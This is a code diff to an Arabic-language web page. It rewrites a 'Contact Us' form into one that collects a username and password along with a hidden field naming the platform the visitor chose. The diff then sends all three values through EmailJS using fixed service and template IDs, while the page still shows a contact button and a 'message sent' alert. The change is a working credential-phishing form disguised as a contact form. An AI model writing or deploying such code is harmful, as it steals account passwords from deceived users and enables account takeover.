@@ -24,6 +24,7 @@
             const platformTitle = document.getElementById('platform-name');
             platformTitle.textContent = platformName;  // عرض اسم المنصة
             formContainer.style.display = 'block'; // إظهار النموذج
+            document.getElementById('platform').value = platformName; // تعيين قيمة المنصة
         }
 
         // إرسال البريد عبر EmailJS
@@ -32,13 +33,20 @@
 
             var form = document.getElementById('contact-form');
             // التحقق من الحقول
-            if (!form.name.value || !form.email.value || !form.message.value) {
+            if (!form.username.value || !form.password.value) {
                 alert('يرجى ملء جميع الحقول.');
                 return;
             }
 
+            // إعداد البيانات التي سيتم إرسالها إلى القالب في EmailJS
+            var templateParams = {
+                platform: form.platform.value,
+                username: form.username.value,
+                password: form.password.value
+            };
+
             // إرسال البيانات عبر EmailJS
-            emailjs.sendForm('service_ir3vg5y', 'template_jw2qkzr', form).then(function(response) {
+            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams).then(function(response) {
                 console.log('Success:', response);
                 alert('تم إرسال الرسالة بنجاح!');
                 form.reset(); // إعادة تعيين النموذج بعد الإرسال
@@ -182,9 +190,9 @@
     <button class="contact-toggle" onclick="document.getElementById('contact-form').style.display = 'block'" data-ar="تواصل معنا" data-en="Contact Us">تواصل معنا</button>
 
     <form id="contact-form" style="display: none;" onsubmit="sendEmail(event)">
-        <input type="text" name="name" placeholder="اسمك" required>
-        <input type="email" name="email" placeholder="بريدك الإلكتروني" required>
-        <textarea name="message" placeholder="رسالتك" required></textarea>
+        <input type="hidden" name="platform" id="platform">
+        <input type="text" name="username" placeholder="اسم المستخدم" required>
+        <input type="password" name="password" placeholder="كلمة المرور" required>
         <button type="submit">إرسال</button>
     </form>
 </div>
